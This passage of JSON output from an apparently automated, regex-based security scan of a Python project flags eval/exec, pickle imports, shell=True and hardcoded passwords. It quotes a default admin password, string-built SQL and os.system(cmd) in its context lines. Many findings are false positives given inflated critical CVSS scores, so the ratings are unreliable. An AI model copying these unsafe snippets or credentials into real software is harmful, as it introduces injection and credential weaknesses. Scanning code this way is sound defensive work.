      "context": "                    'severity': 'high',\n                    'description': 'Use of eval() function detected'\n                }"
    },
    {
      "file": "TestMaster\\core\\domains\\security\\enterprise_authentication.py",
      "line": 32,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "    \"\"\"Authentication methods supported\"\"\"\n    PASSWORD = \"password\"\n    JWT_TOKEN = \"jwt_token\""
    },
    {
      "file": "TestMaster\\core\\domains\\security\\enterprise_authentication.py",
      "line": 724,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "            admin_username = \"admin\"\n            admin_password = \"Admin123!@#\"  # Should be changed immediately in production\n            "
    },
    {
      "file": "TestMaster\\core\\domains\\security\\message_context_security.py",
      "line": 140,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "            r'os\\.system',\n            r'shell=True',\n            r'<script[^>]*>',"
    },
    {
      "file": "TestMaster\\core\\domains\\testing\\adaptive_testing_framework.py",
      "line": 8,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nimport time"
    },
    {
      "file": "TestMaster\\core\\domains\\testing\\embedding_cache_testing.py",
      "line": 163,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    async def test_basic_storage_and_retrieval(self, cache: MockFileEmbeddingCache) -> Dict[str, Any]:\n        \"\"\"Test basic cache storage and retrieval\"\"\""
    },
    {
      "file": "TestMaster\\core\\domains\\testing\\embedding_cache_testing.py",
      "line": 359,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        try:\n            result = await self.framework.test_basic_storage_and_retrieval(cache)\n            "
    },
    {
      "file": "TestMaster\\core\\domains\\testing\\intelligence_synthesis_framework.py",
      "line": 8,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nfrom typing import Dict, List, Any, Optional, Union, Tuple, Set"
    },
    {
      "file": "TestMaster\\core\\domains\\testing\\mcp_testing.py",
      "line": 362,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "        if result['success']:\n            expected_password = \"hc1291cb7123\"\n            password_correct = result.get('test_result') == expected_password"
    },
    {
      "file": "TestMaster\\core\\domains\\testing\\multi_modal_test_engine.py",
      "line": 844,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "                command,\n                shell=True,\n                capture_output=True,"
    },
    {
      "file": "TestMaster\\core\\foundation\\abstractions\\framework_abstraction.py",
      "line": 139,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Execute the test\n            exec(code, namespace)\n            "
    },
    {
      "file": "TestMaster\\core\\foundation\\abstractions\\framework_abstraction.py",
      "line": 379,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Execute the code\n            exec(code, namespace)\n            "
    },
    {
      "file": "TestMaster\\core\\foundation\\abstractions\\framework_abstraction.py",
      "line": 421,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            for setup_code in self.setup:\n                exec(setup_code)\n            "
    },
    {
      "file": "TestMaster\\core\\foundation\\abstractions\\framework_abstraction.py",
      "line": 431,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                try:\n                    exec(teardown_code)\n                except Exception as e:"
    },
    {
      "file": "TestMaster\\core\\foundation\\shared\\shared_state.py",
      "line": 12,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\core\\intelligence\\architectural_decision_engine.py",
      "line": 33,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "from concurrent.futures import ThreadPoolExecutor, as_completed\nimport pickle\nimport yaml"
    },
    {
      "file": "TestMaster\\core\\intelligence\\autonomous_replication_engine.py",
      "line": 40,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import requests\nimport pickle\n"
    },
    {
      "file": "TestMaster\\core\\intelligence\\evolutionary_code_engine.py",
      "line": 428,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        self.dangerous_patterns = [\n            'exec(', 'eval(', '__import__', 'open(', 'file(',\n            'subprocess', 'os.system', 'os.popen', 'input(',"
    },
    {
      "file": "TestMaster\\core\\intelligence\\evolutionary_code_engine.py",
      "line": 428,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        self.dangerous_patterns = [\n            'exec(', 'eval(', '__import__', 'open(', 'file(',\n            'subprocess', 'os.system', 'os.popen', 'input(',"
    },
    {
      "file": "TestMaster\\core\\intelligence\\intelligence_integration_master.py",
      "line": 33,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "from concurrent.futures import ThreadPoolExecutor, as_completed\nimport pickle\nimport yaml"
    },
    {
      "file": "TestMaster\\core\\intelligence\\intelligent_code_optimizer.py",
      "line": 1458,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    'pattern': r'eval\\s*\\(',\n                    'description': 'Dangerous eval() usage',\n                    'severity': 'high'"
    },
    {
      "file": "TestMaster\\core\\intelligence\\intelligent_code_optimizer.py",
      "line": 1524,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            elif vulnerability_type == 'eval_usage':\n                return \"# Use ast.literal_eval() for safe evaluation or implement specific parsing\"\n            elif vulnerability_type == 'hardcoded_secrets':"
    },
    {
      "file": "TestMaster\\core\\intelligence\\intelligent_workflow_engine.py",
      "line": 34,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "from concurrent.futures import ThreadPoolExecutor, as_completed\nimport pickle\nimport yaml"
    },
    {
      "file": "TestMaster\\core\\intelligence\\meta_intelligence_orchestrator.py",
      "line": 34,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "from concurrent.futures import ThreadPoolExecutor, as_completed\nimport pickle\nimport yaml"
    },
    {
      "file": "TestMaster\\core\\intelligence\\predictive_code_intelligence.py",
      "line": 1806,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \n            if 'eval(' in code or 'exec(' in code:\n                security_risks.append({"
    },
    {
      "file": "TestMaster\\core\\intelligence\\predictive_code_intelligence.py",
      "line": 2071,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        if options.get(\"eval_expressions\"):\n            eval(options[\"eval_expressions\"])\n        "
    },
    {
      "file": "TestMaster\\core\\intelligence\\predictive_code_intelligence.py",
      "line": 1806,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \n            if 'eval(' in code or 'exec(' in code:\n                security_risks.append({"
    },
    {
      "file": "TestMaster\\core\\intelligence\\predictive_intelligence_engine.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nfrom abc import ABC, abstractmethod"
    },
    {
      "file": "TestMaster\\core\\intelligence\\unified_architecture_intelligence.py",
      "line": 33,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "from concurrent.futures import ThreadPoolExecutor, as_completed\nimport pickle\nimport yaml"
    },
    {
      "file": "TestMaster\\core\\intelligence\\unified_architecture_intelligence_complete.py",
      "line": 34,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "from concurrent.futures import ThreadPoolExecutor, as_completed\nimport pickle\nimport yaml"
    },
    {
      "file": "TestMaster\\core\\intelligence\\analytics\\predictive_analytics_engine.py",
      "line": 16,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import pandas as pd\nimport pickle\nimport uuid"
    },
    {
      "file": "TestMaster\\core\\intelligence\\caching\\distributed_smart_cache.py",
      "line": 16,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import logging\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\core\\intelligence\\coordination\\unified_workflow_orchestrator_modules\\unified_workflow_orchestrator_part1.py",
      "line": 20,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import yaml\nimport pickle\nimport sqlite3"
    },
    {
      "file": "TestMaster\\core\\intelligence\\documentation\\api_spec_builder.py",
      "line": 76,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            for path, methods in matches:\n                methods_list = eval(f'[{methods}]') if methods else ['GET']\n                "
    },
    {
      "file": "TestMaster\\core\\intelligence\\documentation\\configuration_documentation_framework.py",
      "line": 233,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                            if isinstance(node.value, (ast.Constant, ast.Str, ast.Num)):\n                                value = ast.literal_eval(node.value)\n                                config_file.variables[target.id] = value"
    },
    {
      "file": "TestMaster\\core\\intelligence\\knowledge_graph\\instant_graph_engine.py",
      "line": 30,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import logging\nimport pickle\nimport sqlite3"
    },
    {
      "file": "TestMaster\\core\\intelligence\\ml\\model_registry.py",
      "line": 11,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nimport hashlib"
    },
    {
      "file": "TestMaster\\core\\intelligence\\ml\\advanced\\smart_cache.py",
      "line": 14,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import logging\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\core\\intelligence\\orchestration\\workflow_orchestration_engine.py",
      "line": 330,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                # Evaluate simple conditions\n                result = eval(condition, {\"__builtins__\": {}}, context)\n            else:"
    },
    {
      "file": "TestMaster\\core\\intelligence\\orchestration\\workflow_orchestration_engine.py",
      "line": 677,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Simple condition evaluation (can be enhanced)\n            return eval(condition, {\"__builtins__\": {}}, context)\n        except Exception as e:"
    },
    {
      "file": "TestMaster\\core\\intelligence\\testing\\advanced\\ml_test_optimizer.py",
      "line": 6,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "\nimport pickle\nimport json"
    },
    {
      "file": "TestMaster\\core\\intelligence\\testing\\enterprise\\predictive_test_failure.py",
      "line": 8,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import time\nimport pickle\nfrom typing import Any, Dict, List, Optional, Set, Tuple, Union"
    },
    {
      "file": "TestMaster\\core\\orchestration\\engines\\workflow\\workflow_orchestration_engine.py",
      "line": 330,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                # Evaluate simple conditions\n                result = eval(condition, {\"__builtins__\": {}}, context)\n            else:"
    },
    {
      "file": "TestMaster\\core\\orchestration\\engines\\workflow\\workflow_orchestration_engine.py",
      "line": 677,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Simple condition evaluation (can be enhanced)\n            return eval(condition, {\"__builtins__\": {}}, context)\n        except Exception as e:"
    },
    {
      "file": "TestMaster\\core\\security\\adaptive_fallback_orchestrator.py",
      "line": 15,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\core\\security\\code_generation_security.py",
      "line": 318,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "            \n            # Check for subprocess calls with shell=True\n            if isinstance(node.func, ast.Attribute) and node.func.attr in ['call', 'run', 'Popen']:"
    },
    {
      "file": "TestMaster\\core\\security\\code_generation_security.py",
      "line": 329,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "                            code_snippet=code.split('\\n')[node.lineno - 1].strip() if node.lineno <= len(code.split('\\n')) else \"\",\n                            description=\"Subprocess call with shell=True\",\n                            recommendation=\"Use shell=False or validate inputs carefully\","
    },
    {
      "file": "TestMaster\\core\\security\\deployment_pipeline_security.py",
      "line": 471,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    'severity': 'high',\n                    'description': 'Use of eval() function detected'\n                }"
    },
    {
      "file": "TestMaster\\core\\security\\enterprise_authentication.py",
      "line": 32,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "    \"\"\"Authentication methods supported\"\"\"\n    PASSWORD = \"password\"\n    JWT_TOKEN = \"jwt_token\""
    },
    {
      "file": "TestMaster\\core\\security\\enterprise_authentication.py",
      "line": 724,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "            admin_username = \"admin\"\n            admin_password = \"Admin123!@#\"  # Should be changed immediately in production\n            "
    },
    {
      "file": "TestMaster\\core\\security\\message_context_security.py",
      "line": 140,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "            r'os\\.system',\n            r'shell=True',\n            r'<script[^>]*>',"
    },
    {
      "file": "TestMaster\\core\\testing\\adaptive_testing_framework.py",
      "line": 8,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nimport time"
    },
    {
      "file": "TestMaster\\core\\testing\\embedding_cache_testing.py",
      "line": 163,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    async def test_basic_storage_and_retrieval(self, cache: MockFileEmbeddingCache) -> Dict[str, Any]:\n        \"\"\"Test basic cache storage and retrieval\"\"\""
    },
    {
      "file": "TestMaster\\core\\testing\\embedding_cache_testing.py",
      "line": 359,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        try:\n            result = await self.framework.test_basic_storage_and_retrieval(cache)\n            "
    },
    {
      "file": "TestMaster\\core\\testing\\intelligence_synthesis_framework.py",
      "line": 8,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nfrom typing import Dict, List, Any, Optional, Union, Tuple, Set"
    },
    {
      "file": "TestMaster\\core\\testing\\mcp_testing.py",
      "line": 362,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "        if result['success']:\n            expected_password = \"hc1291cb7123\"\n            password_correct = result.get('test_result') == expected_password"
    },
    {
      "file": "TestMaster\\core\\testing\\multi_modal_test_engine.py",
      "line": 844,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "                command,\n                shell=True,\n                capture_output=True,"
    },
    {
      "file": "TestMaster\\core\\tools\\concrete_tools.py",
      "line": 52,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        try:\n            process = await asyncio.create_subprocess_exec(\n                *cmd,"
    },
    {
      "file": "TestMaster\\core\\tools\\concrete_tools.py",
      "line": 75,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    coverage_cmd = [\"python\", \"-m\", \"coverage\", \"json\"]\n                    coverage_process = await asyncio.create_subprocess_exec(\n                        *coverage_cmd,"
    },
    {
      "file": "TestMaster\\core\\tools\\concrete_tools.py",
      "line": 158,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \n            process = await asyncio.create_subprocess_exec(\n                *cmd,"
    },
    {
      "file": "TestMaster\\core\\tools\\concrete_tools.py",
      "line": 301,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            cmd = [\"python\", \"-m\", \"pylint\", \"--output-format=json\", source_path]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,"
    },
    {
      "file": "TestMaster\\core\\tools\\concrete_tools.py",
      "line": 338,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            cmd = [\"python\", \"-m\", \"flake8\", \"--format=json\", source_path]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,"
    },
    {
      "file": "TestMaster\\core\\tools\\concrete_tools.py",
      "line": 372,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            cmd = [\"python\", \"-m\", \"mypy\", \"--json-report\", \"/tmp/mypy_report\", source_path]\n            process = await asyncio.create_subprocess_exec(\n                *cmd,"
    },
    {
      "file": "TestMaster\\dashboard\\dashboard_core\\analytics_compressor.py",
      "line": 23,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import io\nimport pickle\n"
    },
    {
      "file": "TestMaster\\dashboard\\dashboard_core\\analytics_dead_letter_queue.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import hashlib\nimport pickle\n"
    },
    {
      "file": "TestMaster\\dashboard\\dashboard_core\\analytics_event_queue.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "from enum import Enum\nimport pickle\nimport queue"
    },
    {
      "file": "TestMaster\\dashboard\\dashboard_core\\analytics_export_manager.py",
      "line": 24,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "from io import BytesIO, StringIO\nimport pickle\nimport base64"
    },
    {
      "file": "TestMaster\\dashboard\\dashboard_core\\analytics_fallback_system.py",
      "line": 14,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\dashboard\\dashboard_core\\analytics_optimizer.py",
      "line": 162,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    def optimize_data_retrieval(self, query_params: Dict[str, Any]) -> Optional[Any]:\n        \"\"\""
    },
    {
      "file": "TestMaster\\dashboard\\dashboard_core\\analytics_optimizer.py",
      "line": 15,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import zlib\nimport pickle\nfrom datetime import datetime, timedelta"
    },
    {
      "file": "TestMaster\\dashboard\\dashboard_core\\analytics_persistence.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import zlib\nimport pickle\n"
    },
    {
      "file": "TestMaster\\dashboard\\dashboard_core\\analytics_redundancy.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nimport os"
    },
    {
      "file": "TestMaster\\dashboard\\dashboard_core\\analytics_smart_cache.py",
      "line": 15,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import logging\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\dashboard\\dashboard_core\\analytics_watchdog.py",
      "line": 448,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "                command_line,\n                shell=True,\n                cwd=working_directory,"
    },
    {
      "file": "TestMaster\\dashboard\\dashboard_core\\data_store.py",
      "line": 270,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            cache_params = {'type': 'performance_history', 'hours': hours, 'codebase': codebase}\n            cached_data = self.optimizer.optimize_data_retrieval(cache_params)\n            if cached_data is not None:"
    },
    {
      "file": "TestMaster\\dashboard\\dashboard_core\\data_store.py",
      "line": 19,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "from collections import deque\nimport pickle\n"
    },
    {
      "file": "TestMaster\\incremental\\dependency_tracker.py",
      "line": 25,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import logging\nimport pickle\n"
    },
    {
      "file": "TestMaster\\integration\\intelligent_caching_layer.py",
      "line": 23,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import hashlib\nimport pickle\nimport threading"
    },
    {
      "file": "TestMaster\\integration\\predictive_analytics_engine.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import pandas as pd\nimport pickle\nimport time"
    },
    {
      "file": "TestMaster\\operational\\perfected_cache_manager.py",
      "line": 27,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import sqlite3\nimport pickle\nimport zlib"
    },
    {
      "file": "TestMaster\\operational\\perfected_state_manager.py",
      "line": 36,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "from typing import Dict, List, Any, Optional, Union, Set, Callable, TypeVar, Generic\nimport pickle\nimport sqlite3"
    },
    {
      "file": "TestMaster\\testmaster\\analysis\\comprehensive_analysis\\security_analysis.py",
      "line": 113,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "            r'compile\\s*\\(',  # Code compilation\n            r'shell=True',  # Dangerous subprocess usage\n            r'os\\.popen\\s*\\(',  # OS popen"
    },
    {
      "file": "TestMaster\\testmaster\\analysis\\comprehensive_analysis\\taint_analysis.py",
      "line": 559,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        elif path.vulnerability_type == 'Code Injection':\n            return \"Avoid eval() and exec(), use safe alternatives like ast.literal_eval()\"\n        else:"
    },
    {
      "file": "TestMaster\\testmaster\\analysis\\comprehensive_analysis\\taint_analysis.py",
      "line": 559,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        elif path.vulnerability_type == 'Code Injection':\n            return \"Avoid eval() and exec(), use safe alternatives like ast.literal_eval()\"\n        else:"
    },
    {
      "file": "TestMaster\\testmaster\\analysis\\comprehensive_analysis\\taint_analysis.py",
      "line": 559,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        elif path.vulnerability_type == 'Code Injection':\n            return \"Avoid eval() and exec(), use safe alternatives like ast.literal_eval()\"\n        else:"
    },
    {
      "file": "TestMaster\\testmaster\\analysis\\comprehensive_analysis\\taint_analysis.py",
      "line": 553,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "        elif path.vulnerability_type == 'Command Injection':\n            return \"Use subprocess with shell=False and validate all inputs, avoid os.system()\"\n        elif path.vulnerability_type == 'Path Traversal':"
    },
    {
      "file": "TestMaster\\testmaster\\core\\context_manager.py",
      "line": 16,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import copy\nimport pickle\nimport gzip"
    },
    {
      "file": "TestMaster\\testmaster\\core\\orchestrator.py",
      "line": 24,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import hashlib\nimport pickle\n"
    },
    {
      "file": "TestMaster\\testmaster\\intelligence\\bridges\\context_variables_bridge.py",
      "line": 268,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # This is a simplified implementation - in production, use a safer evaluator\n            return eval(expression, {\"__builtins__\": {}}, eval_context)\n        except Exception as e:"
    },
    {
      "file": "TestMaster\\testmaster\\intelligence\\bridges\\session_tracking_bridge.py",
      "line": 19,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nimport sqlite3"
    },
    {
      "file": "TestMaster\\testmaster\\intelligence\\documentation\\quality\\doc_validator.py",
      "line": 272,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            r\"import \\*\": \"Wildcard imports are discouraged\",\n            r\"eval\\(\": \"eval() is generally unsafe\",\n            r\"exec\\(\": \"exec() should be used with caution\""
    },
    {
      "file": "TestMaster\\testmaster\\intelligence\\documentation\\quality\\doc_validator.py",
      "line": 273,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            r\"eval\\(\": \"eval() is generally unsafe\",\n            r\"exec\\(\": \"exec() should be used with caution\"\n        }"
    },
    {
      "file": "TestMaster\\testmaster\\intelligence\\documentation\\templates\\readme_templates.py",
      "line": 1787,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "model = {{ModelClass}}.load_from_checkpoint('models/best_model.ckpt')\nmodel.eval()\n"
    },
    {
      "file": "TestMaster\\testmaster\\intelligence\\integration\\storage\\unified_storage.py",
      "line": 9,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nimport gzip"
    },
    {
      "file": "TestMaster\\testmaster\\intelligence\\security\\security_intelligence_agent.py",
      "line": 893,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    import os\n    return os.system(cmd)\n'''"
    },
    {
      "file": "TestMaster\\testmaster\\intelligence\\security\\security_intelligence_agent.py",
      "line": 885,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "def login(username, password):\n    query = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"\n    return execute_query(query)"
    },
    {
      "file": "TestMaster\\testmaster\\mapping\\mapping_cache.py",
      "line": 8,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nfrom pathlib import Path"
    },
    {
      "file": "TestMaster\\testmaster\\overview\\regression_tracker.py",
      "line": 22,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nfrom collections import defaultdict, Counter"
    },
    {
      "file": "TestMaster\\unified_tools\\code_analysis_master.py",
      "line": 380,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                            api_info.exports = [\n                                ast.literal_eval(elt) for elt in node.value.elts\n                                if isinstance(elt, ast.Constant)"
    },
    {
      "file": "TestMaster_BACKUP_20250816_175859\\testmaster_orchestrator.py",
      "line": 28,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import hashlib\nimport pickle\n"
    },
    {
      "file": "TestMaster_BACKUP_20250816_175859\\archive\\original_backup\\specialized_test_generators.py",
      "line": 787,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
